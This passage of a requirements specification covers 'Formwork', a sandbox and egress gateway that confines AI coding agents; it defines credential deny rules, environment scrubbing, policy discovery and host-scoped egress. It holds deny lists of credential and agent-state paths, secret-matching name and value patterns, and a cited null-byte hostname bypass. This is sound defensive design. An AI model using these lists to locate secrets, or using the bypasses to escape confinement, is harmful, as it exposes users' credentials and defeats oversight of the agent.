Note (stability, not a security property per §3): the gateway parses newline-delimited JSON-RPC from less-trusted peers — the agent and the stdio backends it spawns — and bounds each frame to a fixed maximum, failing the connection closed on overflow rather than buffering without limit. This is a robustness bound in the spirit of §3's "rlimit bounds for stability," not a claim of DoS resistance (which §3 scopes out). A dead gateway is fail-closed regardless: the confined agent has lost its only door.

### 5.5 Transparency & environment reuse (FW-TRA)

| Req | Requirement |
|---|---|
| <a id="fw-tra1"></a>**FW-TRA1** Ambient reuse | The confined process reuses host interpreters, toolchains, shared libraries, and language package caches, read-only by default. |
| <a id="fw-tra2"></a>**FW-TRA2** Toolchains run clean | Under the default profile, common toolchains (python/pytest, node/npm, git, a C build) run unmodified with zero denials in the common case. |
| <a id="fw-tra3"></a>**FW-TRA3** Sensitive-set subtraction | Credentials, SSH/cloud config, keychains, other projects, and browser profiles are denied/hidden by default even under broad grants. *(Superseded and expanded by the typed credential catalog — §5.9, [FW-CRED1](#fw-cred1)..9 — which adds the env-var arm and exclude-by-type.)* |
| <a id="fw-tra4"></a>**FW-TRA4** Graceful denial | Denials surface as standard errno, never as sandbox-specific crashes; a tool probing an optional ungranted path continues rather than aborting. |
| <a id="fw-tra5"></a>**FW-TRA5** Writable working set | The project directory, a scratch/tmp area, and (optionally) build caches are writable, so the agent can do real work and persist within scope. |
| <a id="fw-tra6"></a>**FW-TRA6** Low overhead | Confinement setup and per-operation overhead stay within the section 8 performance target so interactive agent loops remain responsive. |
| <a id="fw-tra7"></a>**FW-TRA7** Execution-vector write protection | A default write-subtract set masks code-execution and policy-tampering vectors even inside writable grants — `.git/hooks/**`, `.git/config`, `.mcp.json`, editor/agent-config dirs (`.vscode`/`.idea`/`.claude`/…), shell rc files — so a confined agent cannot plant something that later runs unsandboxed. Deny wins over the write grant; the paths stay readable so tooling is unbroken. |
| <a id="fw-tra8"></a>**FW-TRA8** Agent-state & local-secret coverage | The sensitive set covers agent-tool state holding OAuth creds/transcripts (`~/.claude*`, `~/.codex/**`, `~/.gemini/**`, `~/.cursor/**`, the whole `~/.docker/**`) and project-local secrets (`**/.env`), denied even under a broad read grant. |
| <a id="fw-tra9"></a>**FW-TRA9** Launcher-owned paths | Paths the Launcher creates for a session (the session scratch holding the CA bundle, the private temporary directory, the opener shim directory) shall be granted in every read mode, read-only except the temporary directory, and named in the resolved-input disclosure ([FW-FID7](#fw-fid7)). |
| <a id="fw-tra10"></a>**FW-TRA10** Private temporary directory | The Launcher shall create a per-session temporary directory and set `TMPDIR`, `TMP` and `TEMP` to it in the confined environment. |

### 5.6 Operability & fidelity (FW-FID)

| Req | Requirement |
|---|---|
| <a id="fw-fid1"></a>**FW-FID1** Per-capability report | `compile()` returns, per capability: `Enforced \| Partial(reason) \| Unenforceable(reason)`, plus backend and semantics (hide vs deny). *(Extended by FEP-2 with a per-credential-type section labeling each arm — `enforced-via-launcher` vs OS sandbox — and the launcher-contingency disclosure, [FW-CRED8](#fw-cred8).)* |
| <a id="fw-fid2"></a>**FW-FID2** Dry-run / audit | Produce the compiled policy and report without enforcing (CI on non-capable boxes; cross-platform policy development). |
| <a id="fw-fid3"></a>**FW-FID3** Runtime observability | Emit a structured record of grants and denials at runtime, suitable for a host's journal when embedded, or standalone logging otherwise. |
| <a id="fw-fid4"></a>**FW-FID4** Deterministic compile | The same blueprint compiles to a byte-identical policy and report. |
| <a id="fw-fid6"></a>**FW-FID6** Rule provenance & explain | Each effective fs/exec rule carries the layer it came from — `built-in \| profile \| file \| cli \| discovered`. `formwork explain <path>` reports the read, write, and exec verdict for a path, the rule that decides each under the deny-terminal model ([FW-CAP8](#fw-cap8)), and that rule's provenance, without enforcing. Exec is a separate axis ([FW-ISO9](#fw-iso9)): the read/write credential floor never governs it, matching enforcement where an exec grant confers execute only ([FW-XR6](#fw-xr6)). It reflects the merged Blueprint (like `compile`), not the session-only denies `run` adds ([FW-CRED3](#fw-cred3), [FW-XR8](#fw-xr8)). The provenance is a side table beside the merged Blueprint, so the compiler and its determinism ([FW-FID4](#fw-fid4)) are untouched. Extends [FW-CAP5](#fw-cap5) inspectability; the layer tag reuses the discovery provenance idea ([FW-DISC6](#fw-disc6)). *(Added by FEP-3.)* |
| <a id="fw-fid7"></a>**FW-FID7** Resolved-input disclosure | Every artifact a command emits names the inputs it was resolved from and how each was chosen — `flag \| auto-discovered \| builtin` — so anything auto-chosen is announced everywhere the choice has effect. Explaining *rules* ([FW-FID6](#fw-fid6)) is not enough when the *file the rules came from* was picked by a walk the user never saw: the `blueprint: {path, source}` stamp on `compile`/`explain` output and the resolution line on the operator channel are the first instance; any future auto-resolved input (a host profile, a feed choice) carries the same disclosure. |
| <a id="fw-fid8"></a>**FW-FID8** Per-backend report lines | The FidelityReport shall carry, each under the stable JSON key listed below, per-backend verdicts for host scoping, inspection, UDP, pathname sockets, resolver closure, brokering, each `isolate` member, private tmp, each channel, privileged interfaces and process-environment disclosure, and a `withheld` list naming every rule the backend could not install. |
| <a id="fw-fid9"></a>**FW-FID9** Self-explaining refusals | For each Gateway refusal, supervised-connect denial, opener-shim refusal and TLS `unknown_ca` rejection of the session CA, Formwork shall emit on the operator channel, within the run, one line naming what was refused, the deciding rule, and the `explain` invocation that reproduces the verdict, while the confined process receives only a generic refusal ([FW-CRED7](#fw-cred7)). |
| <a id="fw-fid10"></a>**FW-FID10** Host-session detection | Host detection (`formwork-detect`, shown by `explain --json`) shall probe for the host facilities that make each channel reachable (session bus, user manager, display server, keyring service; GUI session on macOS) and for PID-namespace nesting, and record them in the HostProfile. |
| <a id="fw-fid11"></a>**FW-FID11** Explain for hosts and channels | `explain` shall accept a URL, a channel or group name, or a socket path as a positional argument and print the verdict, the deciding rule and layer, the grade for a host, and host reachability for a channel; `explain --hosts` shall print every effective host once with its grade, methods, paths, broker binding and deciding layer. |
| <a id="fw-fid12"></a>**FW-FID12** Egress refusal reasons | Every egress violation record shall carry exactly one reason from the closed set listed below. |
| <a id="fw-fid13"></a>**FW-FID13** Egress grant records | For each admitted tunnel and inspected request, the Gateway shall emit a grant record with host, grade, method, canonical path, status, byte counts and duration, and no header value, body byte or query string. |

The FEP-5 report lines extend the `per_capability` map with the keys `net-host-scope`, `net-inspection`, `net-udp`, `net-unix-socket`, `net-resolver`, `credential-broker`, `isolate-processes`, `isolate-ipc`, `private-tmp`, `channel-<name>`, `privileged-interfaces` and `process-environment`; a channel entry carries `{ verdict, reason, host: { present, via } }`, and rules the backend could not install are listed under `withheld` ([FW-FID8](#fw-fid8)). An egress violation record carries the capability (`net-host-scope`, `net-inspection` or `credential-broker`), the host, port, method and canonical path when known, the deciding rule and its layer, a timestamp, and exactly one reason ([FW-FID12](#fw-fid12)): `host-not-listed` or `host-denied` (host decision); `resolution` or `address-class` (destination); `not-tls`, `sni-mismatch` or `alpn` (ClientHello); `malformed` or `limit` (any parse); `host-mismatch`, `method` or `path` (inspected request); `placeholder` or `reflection` (brokering); `upstream-tls` (upstream certificate verification). Neither shape carries a header value, a body or a query string. Both are Data-model surfaces and version with the report. A real-time violation stream for embedding hosts ([FW-FID5](docs/fep-1.md#fw-fid5)) stays deferred.

### 5.7 Environment (FW-ENV)

Applied by the launcher at spawn (§2) — not the confiner — and reported in the `FidelityReport` like any other capability.

| Req | Requirement |
|---|---|
| <a id="fw-env1"></a>**FW-ENV1** Environment axis | The blueprint carries an `env` posture — passthrough, allowlist (only named vars survive), or scrub (secret-shaped vars removed) — and the child's environment is built at spawn from the filtered set, not inherited wholesale. A capability axis parallel to fs/net/exec/mcp. |
| <a id="fw-env2"></a>**FW-ENV2** Default secret-shaped scrub | The default profile scrubs env vars whose *name* matches a secret shape (`TOKEN\|SECRET\|PASSWORD\|KEY\|AUTH\|CREDENTIAL\|CERT`) or whose *value* matches a high-confidence secret shape (PEM blocks, `ghp_…`, `AKIA…`, `AIza…`, JWT); git's environment-supplied configuration (`GIT_CONFIG_COUNT` with `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`) is judged per entry by its config key and value -- an `http.<url>.extraheader` or a URL carrying a password is secret -- and the surviving entries keep a matching count; minus a blueprint-named allowlist for vars the agent legitimately needs (its model API key). Transparency ([FW-TRA2](#fw-tra2)) is preserved by the allowlist; the scrub is heuristic, so it is reported Partial, never a silent over-claim. |

### 5.8 Blueprint model & format (FW-BP)

The Blueprint is one typed model with multiple surfaces (§4); these requirements pin the layering and the authoring vocabulary.

| Req | Requirement |
|---|---|
| <a id="fw-bp1"></a>**FW-BP1** One model, many surfaces | The Blueprint is a typed, versioned schema. The file format and the CLI flags are two surfaces onto the same model, not two models: any grant/deny/exclusion expressible in one is expressible in the other. |
| <a id="fw-bp2"></a>**FW-BP2** Override precedence | Layers merge in a fixed, documented order, lowest to highest: built-in baseline (the fail-closed empty Blueprint plus the credential-catalog floor) → `extends` chain (depth-first, bases before deriveds) → Blueprint file → `--set` fragments → the discovered layer (`<blueprint>.discovered.toml`, [FW-DISC6](#fw-disc6)) → CLI sugar flags. Postures (read-mode/net/exec/env) are last-set-wins; path sets merge additively; the result is deterministic. Overrides are an additive last layer, never a separate mechanism. |
| <a id="fw-bp3"></a>**FW-BP3** Composition via `extends` | A Blueprint may extend one or more base Blueprints (presets/profiles). Resolution is deterministic and cycles are detected and errored. |
| <a id="fw-bp4"></a>**FW-BP4** allow / deny / subtract vocabulary | First-class allow (reads/writes), deny/subtract (read+write), and write-subtract semantics over path patterns in the [FW-CAP6](#fw-cap6) grammar. At any layer and at equal precedence, deny/subtract wins over allow (safety bias); no allow at any layer shadows a deny at any layer — the only un-deny is the typed credential exclude ([FW-CRED5](#fw-cred5)). No general glob exists. |
| <a id="fw-bp5"></a>**FW-BP5** Path sigils | Blueprint path patterns admit a closed set of authoring sigils, expanded at the CLI edge *before* compilation: `~` → `$HOME` and `$CWD` → the launch directory, so a grant can be written relative to the project it runs in. Fixed tokens only — never general `$VAR` interpolation, since the process environment is exactly what the launcher strips ([FW-CRED2](#fw-cred2)), and letting an arbitrary variable name a path would reopen that surface. An expanded sigil is an absolute path that canonicalizes like any grant ([FW-CAP6](#fw-cap6)/[FW-FID4](#fw-fid4)); an unresolvable sigil (e.g. no readable working directory) fails loud, never silently widening ([FW-INV6](#fw-inv6)). |
| <a id="fw-bp6"></a>**FW-BP6** Flat verb rules | One string is one rule (`"<verb>:<path>"`), identical between the CLI flag (`--rule`), a `--set` fragment, and a file `rules` line — a third surface onto the one model ([FW-BP1](#fw-bp1)). Grants and denies are sets merged by union; the result is order-independent (profile stacking is commutative). Denies narrow from any layer; allows widen and are the only trusted layer (maps onto [FW-CAP2](#fw-cap2)). Verbs desugar into the fields above at the CLI edge, so every verb also has a nested `[fs]` equivalent. *(Added by FEP-3.)* |
| <a id="fw-bp7"></a>**FW-BP7** Mode posture | `unveil` (empty universe) and `subtractive` (ambient minus catalog) are a last-set-wins posture aliasing `[fs] read-mode` ([FW-BP2](#fw-bp2)), not a union rule; setting both in one layer is a loud error, but across layers they compose by ordinary last-wins. The credential floor applies in both modes. *(Added by FEP-3.)* |
| <a id="fw-bp8"></a>**FW-BP8** Discovery trust scope | Implicit blueprint resolution (the `FORMWORK.toml` walk) consults only paths the invoking user controls, and its scope is fixed and documented: launch directory upward, ending at the first ancestor the user does not own (before consulting it), at `$HOME` (compared symlink-resolved, so a symlinked home cannot extend the walk), and never at the filesystem root for a nested cwd. A candidate file the user does not own is refused loudly, fail-closed. A policy file planted in a world-writable or foreign-owned directory silently governing a session is a confused-deputy of the same family [FW-XR8](#fw-xr8) forbids in-session; `--blueprint` remains the explicit door for any file discovery will not trust. |
| <a id="fw-bp9"></a>**FW-BP9** Channel policy shape | The Blueprint shall express channel lifts as an `allow` scope and a `deny` list over the closed channel enum and the fixed groups `desktop` (`clipboard`, `open-url`) and `media` (`screen`, `camera`, `microphone`), with groups expanded at the parse edge. |
| <a id="fw-bp10"></a>**FW-BP10** Channel layering | Across layers, channel `allow` scopes shall union, `deny` entries shall be terminal, and the `"deny"` keyword shall mean an empty `allow` scope. |
| <a id="fw-bp11"></a>**FW-BP11** Locator variables | The Launcher shall re-admit the environment variables by which a lifted channel's platform clients locate it. |
| <a id="fw-bp12"></a>**FW-BP12** Credential entry forms | `allow-credentials` shall accept a bare Catalog type, `broker:<type>`, or an inline binding `{ name, env, hosts, scheme }`; a type present in both bare and `broker:` forms shall resolve to `broker`. |
| <a id="fw-bp13"></a>**FW-BP13** Host-rule grammar | `rules` shall accept host rules of the form `<atoms>:host[:port][/glob]` with the §4 grammar, where the atoms are HTTP methods, `allow`, `tunnel` or `deny`; any host rule shall set the net posture to host-allowlist, and a host rule together with a port tier shall be a compile error. |
| <a id="fw-bp14"></a>**FW-BP14** One host, one grade | The compiler shall reject a blueprint in which a tunnel rule and an inspected rule both match one host and port, or in which a path-scoped `deny` names a host that has no inspected rule, naming the conflicting lines. |
| <a id="fw-bp15"></a>**FW-BP15** Verb atoms | The verb position of a rule shall be a comma-separated list of atoms; for the fs axis the atoms shall be `read`, `write`, `modify` and `exec`, with the landed compound verbs accepted as aliases of the same meaning. |
| <a id="fw-bp16"></a>**FW-BP16** Host target shape | The Blueprint parser shall read a rule target as a path pattern when it begins with `/`, `~`, `$` or `**`, and otherwise as a host target, which it shall accept only if the host contains a dot, is `localhost`, or is an IP literal. |

### 5.9 Credential catalog & launcher (FW-CRED)

A versioned, typed catalog of credential **locations only** — dotfiles, well-known file paths, and environment variable names, keyed by type (aws, gcp, ssh, anthropic, …) — compiled into the binary and applied as a floor under every Blueprint. There is no content scanning and no byte-signature matching (§3 non-goals): because every entry is location-based, every entry is a *hard boundary*. The two location kinds are enforced by two different arms: **path** entries join the confiner's deny set (EACCES); **env** entries are stripped by the launcher pre-spawn (variable absent — see §2 for why this is stronger in kind, and on what it is contingent). The "ambient credentials detector" is not separate machinery: it is [FW-CRED7](#fw-cred7)'s operator-channel itemization of this catalog — deny the superset, report the specifics. Brokering (FEP-5 §3.2, FEP-6 §4.7) is a third treatment of a type beside deny and exclude: the floor stays, and the gateway presents the credential on the type's bound hosts ([FW-CRED10](#fw-cred10)–[FW-CRED19](#fw-cred19)).

| Req | Requirement |
|---|---|
| <a id="fw-cred1"></a>**FW-CRED1** Typed location catalog | A versioned catalog of credential *locations* keyed by type. Each type contributes path patterns and/or env-var names. |
| <a id="fw-cred2"></a>**FW-CRED2** Two kinds, two arms | **path** entries → confiner deny (EACCES); **env** entries → launcher strips the variable before spawn (variable absent). Enforced and reported distinctly. |
| <a id="fw-cred3"></a>**FW-CRED3** Env-points-to-file types | A type may carry both an env var and the file it references (e.g. `GOOGLE_APPLICATION_CREDENTIALS`). Excluding the type strips the variable and denies the referenced file. |
| <a id="fw-cred4"></a>**FW-CRED4** Deny-superset by default | The whole known catalog is blocked/stripped by default (fail-closed); exclusion is opt-in per type ([FW-CRED5](#fw-cred5)). Coverage of uncatalogued secrets is [FW-CRED6](#fw-cred6)'s job. |
| <a id="fw-cred5"></a>**FW-CRED5** Exclude-by-type is un-blocking | `allow-credentials: [aws]` (CLI `--allow-cred aws`) deliberately and visibly lets one type through; nothing adjacent is affected. This is the knob for when the agent genuinely needs a credential. |
| <a id="fw-cred6"></a>**FW-CRED6** Generic backstop | Beyond curated types, a generic rule denies known-sensitive *shapes* — files literally named like credentials or SSH private keys — at any depth, anywhere. A catch-all is location-independent by nature: it must reach the containers, CI runners, and project trees where uncatalogued secrets live, not just `$HOME`, and it stays denied even under a broad grant. Liftable only as the whole named pseudo-type `backstop`. |
| <a id="fw-cred7"></a>**FW-CRED7** Operator/agent channel split | The operator sees itemized "denied/stripped X (type: …)". The confined agent sees a plain EACCES / an absent variable with no catalog annotation — no oracle. |
| <a id="fw-cred8"></a>**FW-CRED8** Report names the mechanism | The FidelityReport marks each covered type `enforced-via-launcher` (env) or `enforced-via-OS-sandbox` (path), and states plainly that env-shading holds only while Formwork is the launching process — the guarantee is launcher-contingent, and the report must not overclaim it as independent of the launcher. |
| <a id="fw-cred9"></a>**FW-CRED9** Floor enforceability is honest per platform | Any-depth floor rows — the `**/…` form, its anchored refinement `<prefix>/**/<suffix>`, and the generic backstop ([FW-CRED6](#fw-cred6)) — are enforceable as a Seatbelt regex (start-pinned for the anchored form, floating for the plain `**/…`) but cannot be rooted by Landlock. Where a floor row is unenforceable on the host it is withheld from the compiled deny set and the affected types (and the backstop) are reported **Partial**, never silently claimed `Enforced` ([FW-INV5](#fw-inv5)). |
| <a id="fw-cred10"></a>**FW-CRED10** Brokered floor | For each brokered credential, the Launcher and the Confiner shall strip and deny its locations exactly as for an unlisted type ([FW-CRED4](#fw-cred4)). |
| <a id="fw-cred11"></a>**FW-CRED11** Credential presentation | The Gateway shall present a brokered credential only on requests to its bound hosts, using the scheme bound to that host: substituting where the request carries the session placeholder, adding the header where the request carries no credential, and refusing with a violation record where the placeholder appears in the request target or a header value of a request to any other inspected host. |
| <a id="fw-cred12"></a>**FW-CRED12** Broker host closure | The compiler shall reject a blueprint that brokers a credential without an inspected rule for each of its bound hosts, or whose only inspected rule for a bound host forwards without TLS (port 80), naming the rule to add or change. |
| <a id="fw-cred13"></a>**FW-CRED13** Service-located credentials | The Catalog shall express credential locations that are services (macOS mach names; Linux bus names and sockets), ship the `os-keyring` type floor-denied by default, and map the `claude` type's macOS location to the keychain. |
| <a id="fw-cred14"></a>**FW-CRED14** Placeholder timing | When a brokered type has an env var, the Launcher shall set it to the per-session placeholder after the Catalog strip and the environment scrub have run. |
| <a id="fw-cred15"></a>**FW-CRED15** Credential custody | The Gateway shall hold each brokered credential outside the sandbox, reading its source at session start and again at the interval the Catalog entry states. |
| <a id="fw-cred16"></a>**FW-CRED16** Broker custody | When the blueprint brokers a credential, the Gateway process shall be non-dumpable (Linux) or deny debugger attachment (macOS) from before it spawns the workload until it exits. |
| <a id="fw-cred17"></a>**FW-CRED17** Reflection guard | For a response to a request on which it presented a brokered credential, the Gateway shall request identity content coding, refuse a response with another content coding, and end the response without releasing any byte that begins an occurrence of a wire encoding of the presented credential. |
| <a id="fw-cred18"></a>**FW-CRED18** No credential on OPTIONS | The Gateway shall not present a brokered credential on an OPTIONS request. |
| <a id="fw-cred19"></a>**FW-CRED19** No credential in cleartext | The Gateway shall present a brokered credential only on a request it forwards to the upstream over TLS. |

### 5.10 Discovery (FW-DISC)

Discovery observes what a confined workload tries to touch and turns denials into candidate grants, so you start tight and let observed behavior write the Blueprint. Auto-granting an agent's *attempts* is a confused-deputy machine, and two properties resolve it. First, the default posture is **observe-then-widen**, never live prompting: a marked learning run records denials without granting them, produces a reviewable proposal, and the accepted result applies to *subsequent* runs — the human decision stays out of the hot path, and no syscall interception is needed on either platform. Second, and central: the credential catalog is the floor discovery cannot erode ([FW-DISC3](#fw-disc3)/[FW-INV8](#fw-inv8)).

| Req | Requirement |
|---|---|
| <a id="fw-disc1"></a>**FW-DISC1** Learning mode | An explicit, non-enforcing-of-widenings learning phase that records denials without granting them at runtime. Distinct and visibly different from an enforced run; the policy itself is enforced unchanged ([FW-INV10](#fw-inv10)). |
| <a id="fw-disc2"></a>**FW-DISC2** Reverse compile | Denials compile *backwards* into a proposed Blueprint diff. Each candidate is tagged: catalog-blocked / inside-auto-widen-zone / needs-review. |
| <a id="fw-disc3"></a>**FW-DISC3** Catalog floor | A denial matching the FW-CRED catalog is never offered as an auto-proposable or one-click candidate grant. Lifting it requires the explicit typed exclude ([FW-CRED5](#fw-cred5)), never the discovery flow. The match is by credential *shape* wherever the kernel observed the denial — denial collection is deliberately over-capture-tolerant (a denial can surface from another process or a different `$HOME`), so a credential-shaped path is withheld regardless of location — and the floor is re-checked again at **accept**, because the proposal file is untrusted input. |
| <a id="fw-disc4"></a>**FW-DISC4** Auto-widen zone | An operator-authored scope in the Blueprint within which discovered grants may be auto-accepted (e.g. project dir, language caches). Outside the zone, review is required. Empty by default — nothing self-grants out of the box. |
| <a id="fw-disc5"></a>**FW-DISC5** Review as itemized diff | Proposals surface on the operator channel as a diff showing what widens and what was withheld and why. Acceptance is per-entry. |
| <a id="fw-disc6"></a>**FW-DISC6** Provenance | An accepted discovered grant is recorded with provenance (added-via-discovery, run id), so audit distinguishes authored from learned grants. |
| <a id="fw-disc11"></a>**FW-DISC11** Loop drivability | The discovery loop — observe, list, accept, next run — is drivable end-to-end from the `learn` surface without the user naming its artifact files: `<blueprint>.proposal.toml` and `<blueprint>.discovered.toml` are implementation conventions that surface in *output* as provenance, never as required *input* knowledge. Derived-path flags (`--proposal`) are fallbacks, not the default path, and a flag a mode would ignore is refused, never silently dropped ([FW-INV6](#fw-inv6) at the CLI surface). *(`FW-DISC7`–`FW-DISC10` are reserved by the in-flight FEP-4 draft and are not landed numbers.)* |
| <a id="fw-disc12"></a>**FW-DISC12** Host and channel discovery | `learn` shall reverse-compile Gateway egress violations and channel denials into proposal entries (host rules, `channels`) on both backends, at the grade an existing rule for the host already has, and shall withhold and itemize metadata and private-IP destinations and credential-typed channels ([FW-DISC3](#fw-disc3)). |

"Formwork never runs a real workload in a grant-whatever-is-attempted mode" is not a separate requirement — it is the combined consequence of [FW-DISC1](#fw-disc1) and [FW-DISC4](#fw-disc4), stated as a guarantee in [FW-INV10](#fw-inv10). Sticky learning within a trust boundary is the recommended workflow: accumulate proposals across runs, auto-accept only inside the operator-drawn zone, review everything else — discovery does the tedious enumeration; the human keeps the perimeter.

### 5.11 Egress (FW-EGR)

Host-scoped egress: the confiner stays default-deny, and a confined process reaches a named host only through the session gateway, which decides each connection and, for an inspected host, each request (§4). FEP-1 set what host-scoped egress permits, FEP-5 how a confined connection reaches the gateway, and FEP-6 the engine that serves it; the engine's limits and timeouts (**head-limit**, **body-buffer** and the rest) are defined once in FEP-6 §4.9 and implemented as named constants in `formwork-gateway`.

| Req | Requirement |
|---|---|
| <a id="fw-egr1"></a>**FW-EGR1** Host-scoped egress | The net axis is a three-way enum — `Deny \| Ports([u16]) \| AllowHosts([HostPattern])` — whose host-allowlist posture is written as host rules in `rules` ([FW-BP13](#fw-bp13)) and mediated by the gateway (the confiner stays default-deny; kernels can't express hosts). Under `AllowHosts`, a confined process reaches an allowlisted host through the gateway and nothing else. *(Amended at reintegration: FEP-5 spells the posture as host rules and gives it a transport, [FW-XR7](#fw-xr7).)* |
| <a id="fw-egr2"></a>**FW-EGR2** Empty means deny | An empty, absent, or unparseable host allowlist compiles to **full deny**, never allow-all, and the report says so. Directly mirrors CVE-2025-66479, where srt's "block everything" list disabled the proxy and allowed everything. |
| <a id="fw-egr3"></a>**FW-EGR3** Hostname canonicalization before match | Host patterns and requested hosts are canonicalized before comparison: reject or neutralize embedded NUL, percent-encoding, CRLF, leading/trailing dots, IDN/Unicode confusables, and IPv6 zone-IDs. Mirrors the srt SOCKS5 `attacker\x00.google.com` bypass and the IPv6-zone-ID hardening now in srt's `domain-pattern.ts`. |
| <a id="fw-egr4"></a>**FW-EGR4** SSRF / metadata default-block | Under the gateway-mediated `AllowHosts` posture, egress to an address outside the global class of the destination class table (FEP-6 §4.5: metadata, the Gateway's own endpoints, the host's own addresses, local and private, special-purpose) is denied unless the rule that admits the host names it as that class requires: metadata and special-purpose addresses only by an IP-literal rule naming the address, local, private and host addresses by an exact-name or IP-literal rule, never by a wildcard ([FW-EGR19](#fw-egr19)), and the Gateway's own endpoints never ([FW-EGR18](#fw-egr18)) (mirrors Cursor's anti-SSRF default). *(Amended by FEP-6 §9 b.)* The `Ports` posture is a *direct* kernel `connect()` the gateway never sees and the kernel cannot filter by IP, so it cannot carry this block; its report states plainly that it reaches any host on the port, metadata included. |
| <a id="fw-egr5"></a>**FW-EGR5** Honest allowlist fidelity | A tunnel-grade host is reported `Partial` with a stated reason: without TLS interception the gateway sees the server name but not the request, so domain fronting behind an admitted name is not caught. The report never claims `Enforced` for a guarantee interception would be required to make. Mirrors srt's own acknowledged limitation. *(Amended at reintegration: FEP-5 made inspection the default grade, [FW-EGR10](#fw-egr10), and FEP-6 added the server-name check, [FW-EGR16](#fw-egr16); the uninspected case this requirement covers is the `tunnel:` grade.)* |
| <a id="fw-egr6"></a>**FW-EGR6** No unauthenticated egress door | The gateway exposes no network-reachable, unauthenticated control surface. A confined process reaches the gateway's egress only through the transport [FW-XR7](#fw-xr7) names, and the egress listener admits only the session's own connections ([FW-EGR9](#fw-egr9)), so no other process, confined or co-resident, can drive the gateway's egress as a confused deputy. *(Amended at reintegration: FEP-5's egress listener replaced the injected-fd-only rationale.)* |
| <a id="fw-egr7"></a>**FW-EGR7** Supervised connect (Linux) | Under the host-allowlist posture on Linux, the Confiner shall deliver every `connect()` on AF_INET, AF_INET6 and AF_UNIX sockets, and every addressed `sendto`/`sendmsg` on an AF_UNIX datagram socket, to a supervisor outside the sandbox, which shall perform any allowed operation itself and install the result in the target. |
| <a id="fw-egr8"></a>**FW-EGR8** Sole egress endpoint (macOS) | Under the host-allowlist posture on macOS, the compiled profile shall permit outbound network only to `localhost:<P>` for the session's Gateway listener and to pathname sockets granted by `allow`. |
| <a id="fw-egr9"></a>**FW-EGR9** Registered egress | The Gateway egress listener shall accept a connection only if its source endpoint was registered by the supervisor (Linux), or if it presents the session credential and its peer PID belongs to the session (macOS). |
| <a id="fw-egr10"></a>**FW-EGR10** Inspected host rule | For an inspected host, the Gateway shall terminate TLS, verify that the SNI, the `Host` header and the CONNECT target agree, and admit a request only if its method and canonicalized path match a rule for that host. |
| <a id="fw-egr11"></a>**FW-EGR11** Request canonicalization | Before matching, the Gateway shall remove dot-segments and decode percent-encoded unreserved characters, and shall reject a request carrying an encoded `/`, a NUL, a backslash in the path, or both `Content-Length` and `Transfer-Encoding`. |
| <a id="fw-egr12"></a>**FW-EGR12** Resolver closure | Under the host-allowlist posture, the Confiner shall deny every local name-resolution path: UDP and the resolver sockets on Linux, and the mDNSResponder literal on macOS. |
| <a id="fw-egr13"></a>**FW-EGR13** Ephemeral CA | The Gateway shall generate the inspection CA in memory per session and shall not write the CA private key to any file nor expose it to any confined process. |
| <a id="fw-egr14"></a>**FW-EGR14** Gateway hosting | `formwork run` in the spawn posture shall host the Gateway whenever the blueprint carries a host rule. |
| <a id="fw-egr15"></a>**FW-EGR15** Loopback listen (macOS) | Under every net posture, the macOS profile shall permit `network-bind` and `network-inbound` on `localhost:*`. |
| <a id="fw-egr16"></a>**FW-EGR16** Tunnel server name | For a tunnel-grade host, the Gateway shall forward bytes upstream only after buffering a complete TLS ClientHello whose server name equals the canonical CONNECT host, and shall refuse a connection whose first byte is not a TLS handshake record. |
| <a id="fw-egr17"></a>**FW-EGR17** Single resolution | Before connecting upstream, the Gateway shall resolve the host once, classify every returned address, including any IPv4 address embedded in an IPv6 address, refuse the connection if any address is in a class the matching rule does not admit, and connect only to addresses from that resolution. |
| <a id="fw-egr18"></a>**FW-EGR18** Gateway self-exclusion | The Gateway shall refuse every upstream connection to its own listener endpoints. |
| <a id="fw-egr19"></a>**FW-EGR19** Local and private admission | The Gateway shall admit a loopback, private, shared, link-local or host-interface address other than a metadata address only for a host matched by an exact-name or IP-literal rule. |
| <a id="fw-egr20"></a>**FW-EGR20** Inspected ALPN | For an inspected host, the Gateway shall offer only `http/1.1` in ALPN and shall refuse a ClientHello whose ALPN list is present and excludes `http/1.1`. |
| <a id="fw-egr21"></a>**FW-EGR21** Streamed bodies | The Gateway shall forward request and response bodies as they arrive, holding at most **body-buffer** bytes of a body per direction in memory. |
| <a id="fw-egr22"></a>**FW-EGR22** Authorized forwarding | For an inspected request, the Gateway shall send upstream a request line built from the method and canonical path that matched, with hop-by-hop headers and `Proxy-Authorization` removed. |
| <a id="fw-egr23"></a>**FW-EGR23** Reflective methods | On an inspected host, the Gateway shall refuse TRACE and CONNECT requests under every rule. |
| <a id="fw-egr24"></a>**FW-EGR24** Upstream verification | The Gateway shall verify every upstream TLS certificate for the requested host name against the host trust store it loaded at session start, and shall never trust the session CA or a file a confined process can write for upstream verification. |
| <a id="fw-egr25"></a>**FW-EGR25** Constrained session CA | The session CA certificate shall carry name constraints whose permitted subtrees are exactly the session's inspected exact names, wildcard suffixes and IP literals. |
| <a id="fw-egr26"></a>**FW-EGR26** Upstream proxy | When `formwork run`'s environment names an upstream proxy, the Gateway shall send admitted egress through it, except to hosts that environment's `NO_PROXY` exempts, and shall report destination classification `Partial` with the reason for each proxied host. |

## 6. Invariants

These hold for every session under every backend, and are the properties the tests in section 7 exist to falsify.

<a id="fw-inv1"></a>**FW-INV1 — No widening.** After `enforce()`, the held capability set can only shrink. No code path widens it. Verified by fuzzing blueprint/narrow sequences and asserting against probes.

<a id="fw-inv2"></a>**FW-INV2 — Descendant containment.** No descendant escapes or relaxes the confiner. Re-exec, setuid/setgid execution, and `prctl` attempts to clear `NO_NEW_PRIVS` do not restore access. Fuzzed over random spawn trees.

<a id="fw-inv3"></a>**FW-INV3 — Egress only via the gateway.** A confined process has no network path except through the gateway. Direct `connect()`, raw sockets, and direct DNS fail closed. Verified adversarially.

<a id="fw-inv4"></a>**FW-INV4 — Shading completeness.** No ungranted tool, resource, or prompt is invocable, whether or not it appears in any listing. Fuzzed over guessed names and out-of-band identifiers.

<a id="fw-inv5"></a>**FW-INV5 — Report soundness.** Anything reported `Enforced` is enforced, verified by paired allow/deny probes; anything the platform cannot enforce is reported, not claimed.

<a id="fw-inv6"></a>**FW-INV6 — No silent open.** No capability-detection failure yields a running-but-unconfined session without an explicit, surfaced `Unenforceable`. Formwork fails closed or fails loud, never fails open-silent.

<a id="fw-inv7"></a>**FW-INV7 — Launcher-strip completeness.** A stripped env var is *absent* (not merely denied) throughout the confined process and its entire descendant tree. The confined process may still set new vars for its own children; this shades ambient inherited credentials, not values the agent synthesizes.

